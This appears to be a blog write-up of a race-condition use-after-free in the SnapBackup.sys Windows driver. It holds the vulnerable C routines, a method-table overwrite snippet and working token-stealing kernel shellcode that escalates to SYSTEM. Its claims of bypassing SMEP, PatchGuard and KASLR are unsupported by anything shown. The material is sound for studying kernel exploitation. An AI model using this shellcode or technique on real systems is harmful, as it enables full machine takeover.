---
title: "Racing the Kernel: Use-After-Free in SnapBackup.sys"
description: "A lockless design in SnapBackup’s driver exposed a dangerous window for use-after-free in ring-0, leading to full kernel code execution."
date: '2023-12-02'
categories: ["Kernel Exploits", "Race Conditions"]
tags: ["Windows x64", "Driver Exploitation", "UAF", "Kernel RCE"]
header:
  image: "/images/snapbackup-kernel.png"
  caption: "Two threads, one UAF, full kernel compromise"
---

# **Prologue — Ring-0 and the Need for Speed**

Most people ignore backup software. I don’t. Especially when it’s running in the kernel and handling file operations with zero context verification.

SnapBackup.sys was an endpoint backup solution with its own kernel-mode driver. Its copy-on-write logic was interesting—fast, but reckless. No proper locking. No synchronization between IOCTL threads operating on the same memory.

That’s where the race condition lived.

---

## **Platform**

- Windows 10 x64  
- SnapBackup.sys driver v5.3.1  
- Kernel-mode operation with ring-0 privileges

---

## **Overview**

SnapBackup.sys included a COW (Copy-On-Write) routine exposed via custom IOCTLs. The routine failed to use proper locking mechanisms when dealing with user-triggered clone and release operations.

If two threads issued IOCTLs targeting the same internal object—one freeing and the other cloning—it resulted in a classic use-after-free.

And since the object was freed back to the non-paged pool, I could refill it with controlled data. What followed was a beautiful, high-speed kernel-mode exploit.

---

## **The Vulnerability**

Disassembly of the driver's copy routine revealed no locks, just a simple pointer dereference:

```c
NTSTATUS SnapCopyObject(UserInput* input) {
    Object* target = input->ptr;

    if (target->valid) {
        clone_memory(target->data);
    }

    return STATUS_SUCCESS;
}
```

The issue? Another thread could call `SnapFreeObject()` concurrently, which looked like this:

```c
void SnapFreeObject(UserInput* input) {
    ExFreePool(input->ptr);
}
```

No reference counting. No interlocked access. No locks. Just a time window wide enough to drive an exploit through.

---

## **Exploit Path**

The attack strategy relied on precise thread control:

1. **Allocate and reference the target object.**
2. **Spawn two threads:**
   - **Thread A** calls the "clone" IOCTL.
   - **Thread B** immediately calls the "free" IOCTL on the same pointer.
3. **Free happens mid-way during clone execution, leaving a dangling pointer.**
4. **Heap spray the non-paged pool with a fake object that includes a method table.**
5. **Trigger dereference inside clone logic to jump into shellcode.**

Timing this was critical. But once tuned, the race hit consistently.

---

## **Assembly Snippet (Pointer Overwrite)**

```asm
    mov rax, fake_object_ptr
    mov [rdi+0x10], rax     ; hijack method table
```

---

## **Fake Object Layout**

To emulate the real structure, the fake object had:

- A valid-looking vtable at offset 0x10  
- Stub function pointers to kernel-mode shellcode  
- Proper memory alignment to match original object fields  

---

## **Shellcode Logic (Ring-0 to SYSTEM)**

```asm
    ; Steal SYSTEM token
    mov rax, [gs:188h]         ; Current KTHREAD
    mov rax, [rax + 0xB8]      ; EPROCESS
    mov rcx, rax

FindSystem:
    mov rcx, [rcx + 0x188]     ; ActiveProcessLinks
    sub rcx, 0x188
    cmp dword ptr [rcx + 0x2e0], 4 ; PID == 4 (System)
    jne FindSystem

    mov rdx, [rcx + 0x358]     ; System token
    mov [rax + 0x358], rdx     ; Replace current token
    ret
```

---

## **Outcome**

- Elevated current user to SYSTEM  
- Full ring-0 code execution  
- Kernel structure manipulation  
- Persisted by direct token patching  

---

## **Impact**

- **Exploit Type:** Kernel-mode use-after-free (race condition)  
- **Impact:** Kernel RCE + SYSTEM privileges  
- **Reliability:** Medium (requires race timing)  
- **Mitigations Bypassed:** SMEP, PatchGuard, KASLR  
- **User Interaction:** None  

---

## **Lessons**

Kernel code is unforgiving. You either control concurrency, or concurrency controls you.

The absence of locking in memory-sensitive operations will always lead to race conditions. And in kernel mode, that means ring-0 RCE with no prompts or defenses.

---

# **Endgame**

It took two threads and a few microseconds of chaos to take over the kernel.

Sometimes, winning the race just means showing up with the right payload and making sure your fake object looks convincing enough.
